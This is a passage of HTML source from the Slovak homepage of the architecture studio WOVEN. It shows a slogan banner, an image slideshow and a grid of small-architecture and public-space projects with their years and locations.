									<section class="elementor-section elementor-top-section elementor-element elementor-element-8ca941d elementor-section-height-min-height elementor-section-items-top hp-banner-wrapper elementor-hidden-mobile elementor-section-boxed elementor-section-height-default" data-id="8ca941d" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;slideshow&quot;,&quot;background_slideshow_gallery&quot;:[{&quot;id&quot;:57,&quot;url&quot;:&quot;https:\/\/woven.sk\/wp-content\/uploads\/2023\/03\/woven_bcg_2.jpg&quot;},{&quot;id&quot;:2555,&quot;url&quot;:&quot;https:\/\/woven.sk\/wp-content\/uploads\/2023\/11\/woven_home_banner_2.webp&quot;},{&quot;id&quot;:2557,&quot;url&quot;:&quot;https:\/\/woven.sk\/wp-content\/uploads\/2023\/11\/woven_home_banner_3.webp&quot;},{&quot;id&quot;:2559,&quot;url&quot;:&quot;https:\/\/woven.sk\/wp-content\/uploads\/2023\/11\/woven_home_banner_4.webp&quot;},{&quot;id&quot;:2561,&quot;url&quot;:&quot;https:\/\/woven.sk\/wp-content\/uploads\/2023\/11\/woven_home_banner_5.webp&quot;}],&quot;background_slideshow_loop&quot;:&quot;yes&quot;,&quot;background_slideshow_slide_duration&quot;:5000,&quot;background_slideshow_slide_transition&quot;:&quot;fade&quot;,&quot;background_slideshow_transition_duration&quot;:500}">
							<div class="elementor-background-overlay"></div>
							<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-c0b1ef8" data-id="c0b1ef8" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-6b0138f text-wrapper elementor-widget elementor-widget-heading" data-id="6b0138f" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.17.0 - 08-11-2023 */
.elementor-heading-title{padding:0;margin:0;line-height:1}.elementor-widget-heading .elementor-heading-title[class*=elementor-size-]>a{color:inherit;font-size:inherit;line-height:inherit}.elementor-widget-heading .elementor-heading-title.elementor-size-small{font-size:15px}.elementor-widget-heading .elementor-heading-title.elementor-size-medium{font-size:19px}.elementor-widget-heading .elementor-heading-title.elementor-size-large{font-size:29px}.elementor-widget-heading .elementor-heading-title.elementor-size-xl{font-size:39px}.elementor-widget-heading .elementor-heading-title.elementor-size-xxl{font-size:59px}</style><h1 class="elementor-heading-title elementor-size-default">Objavujeme, skúmame, ironizujeme, prekonávame,<br/>provokujeme, miešame, premýšľame a rozmazávame<br/>hranice priestorov, vzťahov, prostredí a typológií.</h1>		</div>
				</div>
				<div class="elementor-element elementor-element-7e3893e icon-white elementor-widget elementor-widget-button" data-id="7e3893e" data-element_type="widget" data-widget_type="button.default">
				<div class="elementor-widget-container">
					<div class="elementor-button-wrapper">
			<a class="elementor-button elementor-button-link elementor-size-sm" href="/sk/projekty">
						<span class="elementor-button-content-wrapper">
						<span class="elementor-button-icon elementor-align-icon-left">
				<svg xmlns="http://www.w3.org/2000/svg" width="21" height="12" viewBox="0 0 21 12" fill="none"><path d="M20.495 6.49497C20.7683 6.22161 20.7683 5.77839 20.495 5.50503L16.0402 1.05025C15.7668 0.776886 15.3236 0.776886 15.0503 1.05025C14.7769 1.32362 14.7769 1.76684 15.0503 2.0402L19.01 6L15.0503 9.9598C14.7769 10.2332 14.7769 10.6764 15.0503 10.9497C15.3236 11.2231 15.7668 11.2231 16.0402 10.9497L20.495 6.49497ZM0 6.7H20V5.3H0V6.7Z" fill="black"></path></svg>			</span>
						<span class="elementor-button-text">Preskúmaj projekty</span>
		</span>
					</a>
		</div>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-1c905d2 elementor-section-height-min-height elementor-section-items-top elementor-section-content-space-between hp-banner-wrapper elementor-hidden-desktop elementor-hidden-laptop elementor-hidden-tablet_extra elementor-hidden-tablet elementor-section-boxed elementor-section-height-default" data-id="1c905d2" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
							<div class="elementor-background-overlay"></div>
							<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-3c8a77d" data-id="3c8a77d" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-e2c0418 text-wrapper elementor-widget elementor-widget-heading" data-id="e2c0418" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h1 class="elementor-heading-title elementor-size-default">Objavujeme, skúmame, ironizujeme, prekonávame, provokujeme, miešame, premýšľame a rozmazávame hranice priestorov, vzťahov, prostredí a typológií.</h1>		</div>
				</div>
				<div class="elementor-element elementor-element-5c09730 elementor-widget elementor-widget-button" data-id="5c09730" data-element_type="widget" data-widget_type="button.default">
				<div class="elementor-widget-container">
					<div class="elementor-button-wrapper">
			<a class="elementor-button elementor-button-link elementor-size-sm" href="/sk/projekty">
						<span class="elementor-button-content-wrapper">
						<span class="elementor-button-icon elementor-align-icon-left">
				<svg xmlns="http://www.w3.org/2000/svg" width="21" height="12" viewBox="0 0 21 12" fill="none"><path d="M20.495 6.49497C20.7683 6.22161 20.7683 5.77839 20.495 5.50503L16.0402 1.05025C15.7668 0.776886 15.3236 0.776886 15.0503 1.05025C14.7769 1.32362 14.7769 1.76684 15.0503 2.0402L19.01 6L15.0503 9.9598C14.7769 10.2332 14.7769 10.6764 15.0503 10.9497C15.3236 11.2231 15.7668 11.2231 16.0402 10.9497L20.495 6.49497ZM0 6.7H20V5.3H0V6.7Z" fill="black"></path></svg>			</span>
						<span class="elementor-button-text">Preskúmaj projekty</span>
		</span>
					</a>
		</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-bf14d9f" data-id="bf14d9f" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-6cb1c2b elementor-widget elementor-widget-image-carousel" data-id="6cb1c2b" data-element_type="widget" data-settings="{&quot;slides_to_show_mobile&quot;:&quot;1&quot;,&quot;navigation&quot;:&quot;none&quot;,&quot;autoplay&quot;:&quot;yes&quot;,&quot;pause_on_hover&quot;:&quot;yes&quot;,&quot;pause_on_interaction&quot;:&quot;yes&quot;,&quot;autoplay_speed&quot;:5000,&quot;infinite&quot;:&quot;yes&quot;,&quot;speed&quot;:500}" data-widget_type="image-carousel.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.17.0 - 08-11-2023 */
.elementor-widget-image-carousel .swiper,.elementor-widget-image-carousel .swiper-container{position:static}.elementor-widget-image-carousel .swiper-container .swiper-slide figure,.elementor-widget-image-carousel .swiper .swiper-slide figure{line-height:inherit}.elementor-widget-image-carousel .swiper-slide{text-align:center}.elementor-image-carousel-wrapper:not(.swiper-container-initialized):not(.swiper-initialized) .swiper-slide{max-width:calc(100% / var(--e-image-carousel-slides-to-show, 3))}</style>		<div class="elementor-image-carousel-wrapper swiper-container" dir="ltr">
			<div class="elementor-image-carousel swiper-wrapper" aria-live="off">
								<div class="swiper-slide" role="group" aria-roledescription="slide" aria-label="1 of 5"><figure class="swiper-slide-inner"><img decoding="async" class="swiper-slide-image" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="woven_bcg_2.jpg" data-lazy-src="https://woven.sk/wp-content/uploads/2023/11/woven_bcg_2.jpg" /><noscript><img decoding="async" class="swiper-slide-image" src="https://woven.sk/wp-content/uploads/2023/11/woven_bcg_2.jpg" alt="woven_bcg_2.jpg" /></noscript></figure></div><div class="swiper-slide" role="group" aria-roledescription="slide" aria-label="2 of 5"><figure class="swiper-slide-inner"><img decoding="async" class="swiper-slide-image" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="woven_home_banner_2.webp" data-lazy-src="https://woven.sk/wp-content/uploads/2023/11/woven_home_banner_2-1.webp" /><noscript><img decoding="async" class="swiper-slide-image" src="https://woven.sk/wp-content/uploads/2023/11/woven_home_banner_2-1.webp" alt="woven_home_banner_2.webp" /></noscript></figure></div><div class="swiper-slide" role="group" aria-roledescription="slide" aria-label="3 of 5"><figure class="swiper-slide-inner"><img decoding="async" class="swiper-slide-image" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="woven_home_banner_3.webp" data-lazy-src="https://woven.sk/wp-content/uploads/2023/11/woven_home_banner_3-2.webp" /><noscript><img decoding="async" class="swiper-slide-image" src="https://woven.sk/wp-content/uploads/2023/11/woven_home_banner_3-2.webp" alt="woven_home_banner_3.webp" /></noscript></figure></div><div class="swiper-slide" role="group" aria-roledescription="slide" aria-label="4 of 5"><figure class="swiper-slide-inner"><img decoding="async" class="swiper-slide-image" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="woven_home_banner_4.webp" data-lazy-src="https://woven.sk/wp-content/uploads/2023/11/woven_home_banner_4-3.webp" /><noscript><img decoding="async" class="swiper-slide-image" src="https://woven.sk/wp-content/uploads/2023/11/woven_home_banner_4-3.webp" alt="woven_home_banner_4.webp" /></noscript></figure></div><div class="swiper-slide" role="group" aria-roledescription="slide" aria-label="5 of 5"><figure class="swiper-slide-inner"><img decoding="async" class="swiper-slide-image" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="woven_home_banner_5.webp" data-lazy-src="https://woven.sk/wp-content/uploads/2023/11/woven_home_banner_5-3.webp" /><noscript><img decoding="async" class="swiper-slide-image" src="https://woven.sk/wp-content/uploads/2023/11/woven_home_banner_5-3.webp" alt="woven_home_banner_5.webp" /></noscript></figure></div>			</div>
							
									</div>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
		<div class="elementor-element elementor-element-479ce3d e-flex e-con-boxed e-con e-parent" data-id="479ce3d" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}" data-core-v316-plus="true">
					<div class="e-con-inner">
				<div class="elementor-element elementor-element-6d3f7b0 elementor-grid-2 elementor-grid-tablet-2 elementor-grid-mobile-1 elementor-widget elementor-widget-loop-grid" data-id="6d3f7b0" data-element_type="widget" data-settings="{&quot;template_id&quot;:1717,&quot;columns&quot;:2,&quot;alternate_template&quot;:&quot;yes&quot;,&quot;row_gap&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:80,&quot;sizes&quot;:[]},&quot;row_gap_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:70,&quot;sizes&quot;:[]},&quot;_skin&quot;:&quot;post&quot;,&quot;columns_tablet&quot;:&quot;2&quot;,&quot;columns_mobile&quot;:&quot;1&quot;,&quot;edit_handle_selector&quot;:&quot;[data-elementor-type=\&quot;loop-item\&quot;]&quot;,&quot;row_gap_laptop&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;row_gap_tablet_extra&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;row_gap_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="loop-grid.post">
				<div class="elementor-widget-container">
			<link rel="stylesheet" href="https://woven.sk/wp-content/plugins/elementor-pro/assets/css/widget-loop-builder.min.css">		<div class="elementor-loop-container elementor-grid">
		<style id="loop-1717">.elementor-1717 .elementor-element.elementor-element-1417045{--display:flex;--flex-direction:column;--container-widget-width:100%;--container-widget-height:initial;--container-widget-flex-grow:0;--container-widget-align-self:initial;--background-transition:0.3s;--margin-block-start:0px;--margin-block-end:0px;--margin-inline-start:0px;--margin-inline-end:0px;--padding-block-start:0px;--padding-block-end:0px;--padding-inline-start:111px;--padding-inline-end:111px;}.elementor-1717 .elementor-element.elementor-element-946f130 .elementor-heading-title{font-size:16px;font-weight:700;line-height:26px;}.elementor-1717 .elementor-element.elementor-element-946f130 > .elementor-widget-container{margin:20px 0px 0px 0px;}.elementor-1717 .elementor-element.elementor-element-6e8b35f .elementor-widget-container{text-align:left;color:var( --e-global-color-secondary );font-size:16px;line-height:26px;}@media(max-width:1024px){.elementor-1717 .elementor-element.elementor-element-1417045{--padding-block-start:0px;--padding-block-end:0px;--padding-inline-start:70px;--padding-inline-end:70px;}.elementor-1717 .elementor-element.elementor-element-946f130 > .elementor-widget-container{margin:12px 0px 0px 0px;}}@media(max-width:767px){.elementor-1717 .elementor-element.elementor-element-1417045{--padding-block-start:0px;--padding-block-end:0px;--padding-inline-start:50px;--padding-inline-end:50px;}.elementor-1717 .elementor-element.elementor-element-946f130 > .elementor-widget-container{margin:8px 0px 0px 0px;}}</style>		<div data-elementor-type="loop-item" data-elementor-id="1717" class="elementor elementor-1717 elementor-repeater-item-4e0681c e-loop-item e-loop-item-2980 post-2980 project type-project status-publish has-post-thumbnail hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
						<div class="elementor-element elementor-element-1417045 portfolio-item-wrapper e-flex e-con-boxed e-con e-parent" data-id="1417045" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}" data-core-v316-plus="true">
					<div class="e-con-inner">
				<div class="elementor-element elementor-element-023b1fc elementor-widget elementor-widget-image" data-id="023b1fc" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.17.0 - 08-11-2023 */
.elementor-widget-image{text-align:center}.elementor-widget-image a{display:inline-block}.elementor-widget-image a img[src$=".svg"]{width:48px}.elementor-widget-image img{vertical-align:middle;display:inline-block}</style>													<a href="https://woven.sk/sk/projekt/archipelago-2/">
							<img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" title="woven-workshop-archipelago-final-04" alt="woven-workshop-archipelago-final-04" data-lazy-src="https://woven.sk/wp-content/uploads/elementor/thumbs/woven-workshop-archipelago-final-04-qfsqp0d0765gh69pkshlr33mk0w1q6pr7yvvi2zpxm.jpg" /><noscript><img decoding="async" src="https://woven.sk/wp-content/uploads/elementor/thumbs/woven-workshop-archipelago-final-04-qfsqp0d0765gh69pkshlr33mk0w1q6pr7yvvi2zpxm.jpg" title="woven-workshop-archipelago-final-04" alt="woven-workshop-archipelago-final-04" loading="lazy" /></noscript>								</a>
															</div>
				</div>
				<div class="elementor-element elementor-element-946f130 elementor-widget elementor-widget-heading" data-id="946f130" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default"><a href="https://woven.sk/sk/projekt/archipelago-2/">Archipelago</a></h2>		</div>
				</div>
				<div class="elementor-element elementor-element-6e8b35f elementor-widget elementor-widget-theme-post-excerpt" data-id="6e8b35f" data-element_type="widget" data-widget_type="theme-post-excerpt.default">
				<div class="elementor-widget-container">
			2020-2021, Primaciálne námestie a Tyršovo nábrežie, Bratislava, SK		</div>
				</div>
					</div>
				</div>
						</div>
		<style id="loop-1721">.elementor-1721 .elementor-element.elementor-element-1417045{--display:flex;--flex-direction:column;--container-widget-width:100%;--container-widget-height:initial;--container-widget-flex-grow:0;--container-widget-align-self:initial;--background-transition:0.3s;--margin-block-start:0px;--margin-block-end:0px;--margin-inline-start:0px;--margin-inline-end:0px;--padding-block-start:0px;--padding-block-end:0px;--padding-inline-start:0px;--padding-inline-end:0px;}.elementor-1721 .elementor-element.elementor-element-946f130 .elementor-heading-title{font-size:16px;font-weight:700;line-height:26px;}.elementor-1721 .elementor-element.elementor-element-946f130 > .elementor-widget-container{margin:20px 0px 0px 0px;}.elementor-1721 .elementor-element.elementor-element-6e8b35f .elementor-widget-container{text-align:left;color:var( --e-global-color-secondary );font-size:16px;line-height:26px;}@media(max-width:1024px){.elementor-1721 .elementor-element.elementor-element-946f130 > .elementor-widget-container{margin:12px 0px 0px 0px;}}@media(max-width:767px){.elementor-1721 .elementor-element.elementor-element-946f130 > .elementor-widget-container{margin:8px 0px 0px 0px;}}</style>		<div data-elementor-type="loop-item" data-elementor-id="1721" class="elementor elementor-1721 elementor-repeater-item-0d3df3c e-loop-item e-loop-item-2977 post-2977 project type-project status-publish has-post-thumbnail hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
						<div class="elementor-element elementor-element-1417045 portfolio-item-wrapper e-flex e-con-boxed e-con e-parent" data-id="1417045" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}" data-core-v316-plus="true">
					<div class="e-con-inner">
				<div class="elementor-element elementor-element-023b1fc elementor-widget elementor-widget-image" data-id="023b1fc" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
																<a href="https://woven.sk/sk/projekt/bata-point-2/">
							<img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" title="woven-workshop-beta-point-final-08" alt="woven-workshop-beta-point-final-08" data-lazy-src="https://woven.sk/wp-content/uploads/elementor/thumbs/woven-workshop-beta-point-final-08-qfsq7vqvnumexfbkjbleizvsh4xw9fvicj9ddu6f2m.jpg" /><noscript><img decoding="async" src="https://woven.sk/wp-content/uploads/elementor/thumbs/woven-workshop-beta-point-final-08-qfsq7vqvnumexfbkjbleizvsh4xw9fvicj9ddu6f2m.jpg" title="woven-workshop-beta-point-final-08" alt="woven-workshop-beta-point-final-08" loading="lazy" /></noscript>								</a>
															</div>
				</div>
				<div class="elementor-element elementor-element-946f130 elementor-widget elementor-widget-heading" data-id="946f130" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default"><a href="https://woven.sk/sk/projekt/bata-point-2/">Baťa Point</a></h2>		</div>
				</div>
				<div class="elementor-element elementor-element-6e8b35f elementor-widget elementor-widget-theme-post-excerpt" data-id="6e8b35f" data-element_type="widget" data-widget_type="theme-post-excerpt.default">
				<div class="elementor-widget-container">
			2023, Partizánske, SK		</div>
				</div>
					</div>
				</div>
						</div>
				<div data-elementor-type="loop-item" data-elementor-id="1721" class="elementor elementor-1721 elementor-repeater-item-3751e79 e-loop-item e-loop-item-2978 post-2978 project type-project status-publish has-post-thumbnail hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
						<div class="elementor-element elementor-element-1417045 portfolio-item-wrapper e-flex e-con-boxed e-con e-parent" data-id="1417045" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}" data-core-v316-plus="true">
					<div class="e-con-inner">
				<div class="elementor-element elementor-element-023b1fc elementor-widget elementor-widget-image" data-id="023b1fc" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
																<a href="https://woven.sk/sk/projekt/lesna-sauna/">
							<img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" title="woven-workshop-forest-sauna-final-19" alt="woven-workshop-forest-sauna-final-19" data-lazy-src="https://woven.sk/wp-content/uploads/elementor/thumbs/woven-workshop-forest-sauna-final-19-qfsnwo38mupl466xfupeahtra533u2iyko4wwzk3wu.jpg" /><noscript><img decoding="async" src="https://woven.sk/wp-content/uploads/elementor/thumbs/woven-workshop-forest-sauna-final-19-qfsnwo38mupl466xfupeahtra533u2iyko4wwzk3wu.jpg" title="woven-workshop-forest-sauna-final-19" alt="woven-workshop-forest-sauna-final-19" loading="lazy" /></noscript>								</a>
															</div>
				</div>
				<div class="elementor-element elementor-element-946f130 elementor-widget elementor-widget-heading" data-id="946f130" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default"><a href="https://woven.sk/sk/projekt/lesna-sauna/">Lesná Sauna</a></h2>		</div>
				</div>
				<div class="elementor-element elementor-element-6e8b35f elementor-widget elementor-widget-theme-post-excerpt" data-id="6e8b35f" data-element_type="widget" data-widget_type="theme-post-excerpt.default">
				<div class="elementor-widget-container">
			2018-2020, Spišský Hrhov, SK		</div>
				</div>
					</div>
				</div>
						</div>
				<div data-elementor-type="loop-item" data-elementor-id="1717" class="elementor elementor-1717 elementor-repeater-item-72ba964 e-loop-item e-loop-item-2981 post-2981 project type-project status-publish has-post-thumbnail hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
						<div class="elementor-element elementor-element-1417045 portfolio-item-wrapper e-flex e-con-boxed e-con e-parent" data-id="1417045" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}" data-core-v316-plus="true">
					<div class="e-con-inner">
				<div class="elementor-element elementor-element-023b1fc elementor-widget elementor-widget-image" data-id="023b1fc" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
																<a href="https://woven.sk/sk/projekt/terrace-design-for-goethe-institute-2/">
							<img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" title="woven_home_banner_5.webp" alt="woven_home_banner_5.webp" data-lazy-src="https://woven.sk/wp-content/uploads/elementor/thumbs/woven_home_banner_5-3-qfss7bhb2khva3dsg9lltdqe5h7igmbg0rttpmgufe.webp" /><noscript><img decoding="async" src="https://woven.sk/wp-content/uploads/elementor/thumbs/woven_home_banner_5-3-qfss7bhb2khva3dsg9lltdqe5h7igmbg0rttpmgufe.webp" title="woven_home_banner_5.webp" alt="woven_home_banner_5.webp" loading="lazy" /></noscript>								</a>
															</div>
				</div>
				<div class="elementor-element elementor-element-946f130 elementor-widget elementor-widget-heading" data-id="946f130" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default"><a href="https://woven.sk/sk/projekt/terrace-design-for-goethe-institute-2/">Nová terasa</a></h2>		</div>
				</div>
				<div class="elementor-element elementor-element-6e8b35f elementor-widget elementor-widget-theme-post-excerpt" data-id="6e8b35f" data-element_type="widget" data-widget_type="theme-post-excerpt.default">
				<div class="elementor-widget-container">
			2022, Goetheho Inštitút, Bratislava, SK		</div>
				</div>
					</div>
				</div>
						</div>
				<div data-elementor-type="loop-item" data-elementor-id="1717" class="elementor elementor-1717 elementor-repeater-item-4e0681c e-loop-item e-loop-item-2979 post-2979 project type-project status-publish has-post-thumbnail hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
						<div class="elementor-element elementor-element-1417045 portfolio-item-wrapper e-flex e-con-boxed e-con e-parent" data-id="1417045" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}" data-core-v316-plus="true">
					<div class="e-con-inner">
				<div class="elementor-element elementor-element-023b1fc elementor-widget elementor-widget-image" data-id="023b1fc" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
																<a href="https://woven.sk/sk/projekt/pobytove-schody/">
							<img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" title="woven-workshop-lakeside-sitting-steps-final-17" alt="woven-workshop-lakeside-sitting-steps-final-17" data-lazy-src="https://woven.sk/wp-content/uploads/elementor/thumbs/woven-workshop-lakeside-sitting-steps-final-17-qfsoe7qs7it7toj81i3mmh8yv6z4pz0wu676pnr40a.jpg" /><noscript><img decoding="async" src="https://woven.sk/wp-content/uploads/elementor/thumbs/woven-workshop-lakeside-sitting-steps-final-17-qfsoe7qs7it7toj81i3mmh8yv6z4pz0wu676pnr40a.jpg" title="woven-workshop-lakeside-sitting-steps-final-17" alt="woven-workshop-lakeside-sitting-steps-final-17" loading="lazy" /></noscript>								</a>
															</div>
				</div>
				<div class="elementor-element elementor-element-946f130 elementor-widget elementor-widget-heading" data-id="946f130" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default"><a href="https://woven.sk/sk/projekt/pobytove-schody/">Pobytové schody</a></h2>		</div>
				</div>
				<div class="elementor-element elementor-element-6e8b35f elementor-widget elementor-widget-theme-post-excerpt" data-id="6e8b35f" data-element_type="widget" data-widget_type="theme-post-excerpt.default">
				<div class="elementor-widget-container">
			2022, Železná Studnička, Bratislava, SK		</div>
				</div>
					</div>
				</div>
						</div>
				<div data-elementor-type="loop-item" data-elementor-id="1721" class="elementor elementor-1721 elementor-repeater-item-3751e79 e-loop-item e-loop-item-2982 post-2982 project type-project status-publish has-post-thumbnail hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
						<div class="elementor-element elementor-element-1417045 portfolio-item-wrapper e-flex e-con-boxed e-con e-parent" data-id="1417045" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}" data-core-v316-plus="true">
					<div class="e-con-inner">
				<div class="elementor-element elementor-element-023b1fc elementor-widget elementor-widget-image" data-id="023b1fc" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
																<a href="https://woven.sk/sk/projekt/pod-tym-nad-tym/">
							<img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" title="woven-workshop-below-and-above-final-06" alt="woven-workshop-below-and-above-final-06" data-lazy-src="https://woven.sk/wp-content/uploads/elementor/thumbs/woven-workshop-below-and-above-final-06-qfsnkh4lz80oi9wjn2ymg2lhv76ozf4b8bh5srmymm.jpg" /><noscript><img decoding="async" src="https://woven.sk/wp-content/uploads/elementor/thumbs/woven-workshop-below-and-above-final-06-qfsnkh4lz80oi9wjn2ymg2lhv76ozf4b8bh5srmymm.jpg" title="woven-workshop-below-and-above-final-06" alt="woven-workshop-below-and-above-final-06" loading="lazy" /></noscript>								</a>
															</div>
				</div>
				<div class="elementor-element elementor-element-946f130 elementor-widget elementor-widget-heading" data-id="946f130" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default"><a href="https://woven.sk/sk/projekt/pod-tym-nad-tym/">Pod Tým Nad Tým</a></h2>		</div>
				</div>
				<div class="elementor-element elementor-element-6e8b35f elementor-widget elementor-widget-theme-post-excerpt" data-id="6e8b35f" data-element_type="widget" data-widget_type="theme-post-excerpt.default">
				<div class="elementor-widget-container">
			2019, Červená studňa, Banská Štiavnica, SK		</div>
				</div>
					</div>
				</div>
						</div>
				</div>
		
				</div>
				</div>
					</div>
				</div>
							</div>
				<div data-elementor-type="footer" data-elementor-id="1190" class="elementor elementor-1190 elementor-8 elementor-location-footer" data-elementor-post-type="elementor_library">
								<section class="elementor-section elementor-top-section elementor-element elementor-element-8727177 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="8727177" data-element_type="section" id="Footer">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-1c0199c" data-id="1c0199c" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<section class="elementor-section elementor-inner-section elementor-element elementor-element-a6c3cd6 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="a6c3cd6" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-29df02a" data-id="29df02a" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-82ed9e5 text-wrapper elementor-widget elementor-widget-text-editor" data-id="82ed9e5" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							WOVEN sa zameriava na malú architektúru, hravé zásahy do prostredia a intervencie do verejného priestoru.						</div>
				</div>
				<div class="elementor-element elementor-element-90fe911 elementor-widget elementor-widget-button" data-id="90fe911" data-element_type="widget" data-widget_type="button.default">
				<div class="elementor-widget-container">
					<div class="elementor-button-wrapper">
			<a class="elementor-button elementor-button-link elementor-size-sm" href="/sk/studio">
						<span class="elementor-button-content-wrapper">
						<span class="elementor-button-icon elementor-align-icon-left">
				<svg xmlns="http://www.w3.org/2000/svg" width="21" height="12" viewBox="0 0 21 12" fill="none"><path d="M20.495 6.49497C20.7683 6.22161 20.7683 5.77839 20.495 5.50503L16.0402 1.05025C15.7668 0.776886 15.3236 0.776886 15.0503 1.05025C14.7769 1.32362 14.7769 1.76684 15.0503 2.0402L19.01 6L15.0503 9.9598C14.7769 10.2332 14.7769 10.6764 15.0503 10.9497C15.3236 11.2231 15.7668 11.2231 16.0402 10.9497L20.495 6.49497ZM0 6.7H20V5.3H0V6.7Z" fill="black"></path></svg>			</span>
						<span class="elementor-button-text">zistiť viac</span>
		</span>
					</a>
		</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-a1205d7" data-id="a1205d7" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<section class="elementor-section elementor-inner-section elementor-element elementor-element-af981b8 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="af981b8" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-1d8ceb2 elementor-hidden-tablet elementor-hidden-mobile" data-id="1d8ceb2" data-element_type="column">
			<div class="elementor-widget-wrap">
									</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-a2d502f contact-us-wrapper" data-id="a2d502f" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
